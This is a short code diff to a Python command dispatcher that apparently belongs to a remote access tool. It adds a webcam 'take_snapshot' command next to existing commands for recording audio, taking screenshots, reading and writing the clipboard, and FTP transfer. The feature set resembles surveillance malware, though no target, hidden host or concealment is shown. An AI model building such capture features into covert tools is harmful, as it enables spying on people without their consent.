@@ -5,6 +5,7 @@ from rich import print
 import audio_utils
 import misc_utils
 import ftp_utils
+import video_utils
 
 class InvalidCommandError(Exception):
   pass
@@ -17,6 +18,7 @@ class Command(Enum):
   STOP_PLAYING_AUDIO = 'stop_audio_playback'
   RECORD_AUDIO = 'record_audio'
   STOP_RECORDING_AUDIO = 'stop_recording_audio'
+  TAKE_SNAPSHOT = 'take_snapshot'
   TAKE_SCREENSHOT = 'screenshot'
   READ_CLIPBOARD = 'read_clipboard'
   WRITE_CLIPBOARD = 'write_clipboard'
@@ -51,6 +53,10 @@ COMMANDS = {
     Command.STOP_RECORDING_AUDIO: {
         'description': 'Stop recording audio.',
         'method': audio_utils.stop_recording_audio
+    },
+    Command.TAKE_SNAPSHOT: {
+        'description': 'Take a picture with the webcam.',
+        'method': video_utils.take_snapshot
     },
     Command.TAKE_SCREENSHOT: {
         'description': 'Take a screenshot.',
